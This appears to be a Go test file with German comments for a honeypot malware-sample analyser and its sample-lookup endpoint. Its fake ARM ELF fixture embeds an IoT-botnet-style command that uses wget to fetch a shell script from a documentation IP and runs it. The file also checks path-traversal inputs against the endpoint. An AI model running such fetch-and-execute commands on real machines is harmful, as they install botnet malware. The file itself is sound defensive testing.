package main

import (
	"crypto/sha256"
	"encoding/hex"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fakeELF: 32-Bit-ARM-Kopf (Little-Endian) mit eingebetteten Zeichenketten. Die Inhalte
// entstehen zur Laufzeit (mk aus indicators_test.go), siehe dort zum Virenscanner.
func fakeELF() []byte {
	b := make([]byte, 52)
	copy(b, "\x7fELF")
	b[4], b[5], b[6] = 1, 1, 1 // 32 Bit, Little-Endian, Version
	b[16], b[18] = 2, 40       // ET_EXEC, EM_ARM
	b = append(b, mk("UP", "X!")...)
	b = append(b, 0, 0)
	b = append(b, mk("cd /tmp; wg", "et http://198.51.100.23/b", "ins.sh; sh bins.sh")...)
	b = append(b, 0)
	b = append(b, mk("/bin/busy", "box ZQXW")...)
	b = append(b, 0, 'a', 'b', 0)
	b = append(b, "203.0.113.77 10.0.0.1"...)
	return b
}

func TestAnalyzeSample(t *testing.T) {
	si := analyzeSample(fakeELF())
	if si.Type != "ELF-Programm (Linux)" || si.Arch != "ARM" || si.Bits != 32 || si.Endian != "Little-Endian" || si.Packed != "UPX" || !si.Static {
		t.Errorf("Kopf: %+v", si)
	}
	if len(si.URLs) != 1 || si.URLs[0] != "http://198.51.100.23/bins.sh" {
		t.Errorf("URLs: %v", si.URLs)
	}
	if len(si.IPs) != 2 { // 198.51.100.23 aus der URL und 203.0.113.77; 10.0.0.1 ist privat
		t.Errorf("IPs: %v", si.IPs)
	}
	got := map[string]bool{}
	for _, p := range si.Patterns {
		got[p.Key] = true
	}
	if !got["download_exec"] || !got["iot_botnet"] {
		t.Errorf("Muster: %+v", si.Patterns)
	}
	if s := analyzeSample([]byte("#!/bin/sh\nwget x\n")); s.Type != "Skript" || s.Interpreter != "#!/bin/sh" {
		t.Errorf("Skript: %+v", s)
	}
}

func TestSampleEndpoint(t *testing.T) {
	h := testHive(t)
	h.cowrieLibDir = t.TempDir()
	os.MkdirAll(filepath.Join(h.cowrieLibDir, "downloads"), 0o755)
	data := fakeELF()
	sum := sha256.Sum256(data)
	hash := hex.EncodeToString(sum[:])
	os.WriteFile(filepath.Join(h.cowrieLibDir, "downloads", hash), data, 0o644)
	os.WriteFile(filepath.Join(h.cowrieLibDir, "geheim"), []byte("x"), 0o644)

	w := httptest.NewRecorder()
	h.sample(w, httptest.NewRequest("GET", "/api/sample?hash="+hash, nil))
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"arch":"ARM"`) {
		t.Fatalf("Abruf: %d %s", w.Code, w.Body.String())
	}
	si, _ := h.loadSample(hash)
	if si.Mismatch || si.Size != int64(len(data)) {
		t.Errorf("Hash/Größe: %+v", si)
	}
	for _, bad := range []string{"../geheim", "..%2fgeheim", "0000", hash[:63] + "g"} {
		w := httptest.NewRecorder()
		h.sample(w, httptest.NewRequest("GET", "/api/sample?hash="+bad, nil))
		if w.Code != 404 {
			t.Errorf("%q: %d", bad, w.Code)
		}
	}
}
